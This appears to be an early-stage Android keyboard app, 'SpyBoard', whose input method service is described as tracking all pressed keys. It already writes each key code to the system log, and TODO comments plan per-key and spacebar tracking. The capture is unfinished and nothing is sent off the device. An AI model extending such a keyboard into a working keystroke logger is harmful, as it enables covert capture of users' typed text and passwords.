package com.idankorenisraeli.spyboard;

import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputConnection;

/**
 * This class will simulate the functionality of an android keyboard,
 * With custom tracking of all the pressed keys
 */
public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {

    SpyKeyboardView keyboardView;
    
    boolean caps = false;
    boolean hebrewMode = false;

    Keyboard engKeyboard, hebKeyboard;


    private final static int WHITE_THEME = 1;
    private final static int GRAY_THEME = 2;
    private final static int BLUE_THEME = 3;



    @Override
    public View onCreateInputView() {
        // get the KeyboardView and add our Keyboard layout to it
        keyboardView = (SpyKeyboardView) getLayoutInflater().inflate(R.layout.keyboard_view_blue, null);
        engKeyboard = new Keyboard(this, R.xml.qwerty_eng);
        hebKeyboard = new Keyboard(this, R.xml.qwerty_heb);

        keyboardView.setKeyboard(engKeyboard); //english by default
        keyboardView.setOnKeyboardActionListener(keyBoardAction);

        keyboardView.setPreviewEnabled(false);



        return keyboardView;
    }

    private void switchLanguage(){
        hebrewMode = !hebrewMode;
        keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
        // Updating the keyboard view based on the current mode
    }


    private void pressedDelete(InputConnection ic){
        CharSequence selectedText = ic.getSelectedText(0);
        if (TextUtils.isEmpty(selectedText)) {
            // no selection, so delete previous character
            ic.deleteSurroundingText(1, 0);
        } else {
            // delete the selection
            ic.commitText("", 1);
        }
    }

    private void pressedShift(){
        caps = !caps;
    }
    

    private void pressedCharacter(int primaryCode, InputConnection ic){
        primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
        char code = (char) primaryCode; // converting to char
        ic.commitText(String.valueOf(code), 1); //writing to screen

        // TODO: 30/12/2020 Add tacking of this key
    }


    // TODO: 30/12/2020 Add spacebar tacking 
    
    KeyboardView.OnKeyboardActionListener keyBoardAction = new KeyboardView.OnKeyboardActionListener() {
        @Override
        public void onPress(int primaryCode) {

        }

        @Override
        public void onRelease(int primaryCode) {

        }

        @Override
        public void onKey(int primaryCode, int[] keyCodes) {
            Log.i("pttt", "primary: " + primaryCode + " | keycodes: " + keyCodes.length);
            InputConnection ic = getCurrentInputConnection();
            if (ic == null) return;
            switch (primaryCode) {
                case Keyboard.KEYCODE_DELETE:
                    pressedDelete(ic);
                    break;
                case Keyboard.KEYCODE_SHIFT:
                    pressedShift();
                    break;
                case Keyboard.KEYCODE_MODE_CHANGE:
                    switchLanguage();
                    break;
                default:
                    pressedCharacter(primaryCode, ic);
            }
        }
        


        @Override
        public void onText(CharSequence text) {

        }

        @Override
        public void swipeLeft() {

        }

        @Override
        public void swipeRight() {

        }

        @Override
        public void swipeDown() {

        }

        @Override
        public void swipeUp() {

        }
    };
}